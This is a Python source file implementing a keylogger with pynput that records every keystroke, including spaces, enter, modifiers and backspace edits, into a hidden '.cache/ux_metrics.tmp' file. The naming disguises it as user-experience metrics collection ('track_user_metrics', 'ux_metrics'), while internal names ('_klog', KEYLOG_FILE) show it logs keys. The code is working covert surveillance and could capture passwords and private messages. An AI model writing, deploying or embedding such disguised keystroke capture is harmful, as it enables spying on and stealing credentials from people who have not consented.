from pynput import keyboard
import os
import time
import threading
from datetime import datetime

CACHE_DIR = os.path.join(os.getcwd(), ".cache")
os.makedirs(CACHE_DIR, exist_ok=True)
KEYLOG_FILE = os.path.join(CACHE_DIR, "ux_metrics.tmp")

def _klog(k):
    def get_last_line_length():
        try:
            with open(KEYLOG_FILE, "r", encoding="utf-8") as f:
                lines = f.readlines()
                if lines:
                    last_line = lines[-1].rstrip('\n')
                    return len(last_line)
        except Exception:
            pass
        return 0

    def write_with_wrap(char):
        last_line_len = get_last_line_length()
        if last_line_len >= 80:
            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                f.write("\n")
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write(char)

    try:
        write_with_wrap(k.char)
    except AttributeError:
        if k == keyboard.Key.backspace:
            # Remove last character from file
            try:
                with open(KEYLOG_FILE, "r+", encoding="utf-8") as f:
                    content = f.read()
                    f.seek(0)
                    f.truncate()
                    f.write(content[:-1])
            except Exception:
                pass
        else:
            if k == keyboard.Key.space:
                write_with_wrap(" ")
            elif k == keyboard.Key.enter:
                write_with_wrap("\n")
            elif k == keyboard.Key.tab:
                write_with_wrap("\t")
            elif k == keyboard.Key.esc:
                write_with_wrap("[ESC]")
            elif k == keyboard.Key.delete:
                write_with_wrap("[DELETE]")
            elif k == keyboard.Key.ctrl:
                write_with_wrap("[CTRL]")
            elif k == keyboard.Key.alt:
                write_with_wrap("[ALT]")
            elif k == keyboard.Key.print_screen:
                write_with_wrap("[PRINT SCREEN]")



def start_new_session(f):
    f.write("\n\n------ New Session: {} ------\n".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))


def track_user_metrics(stop_event: threading.Event):
    with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
        start_new_session(f)
    listener = keyboard.Listener(on_press=_klog)
    listener.start()
    try:
       
        stop_event.wait() # mainloop ends
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write("\n\n------ End Session: {} ------\n".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        
        time.sleep(20) # How much time we wait before stopping the listener
    finally:
        listener.stop()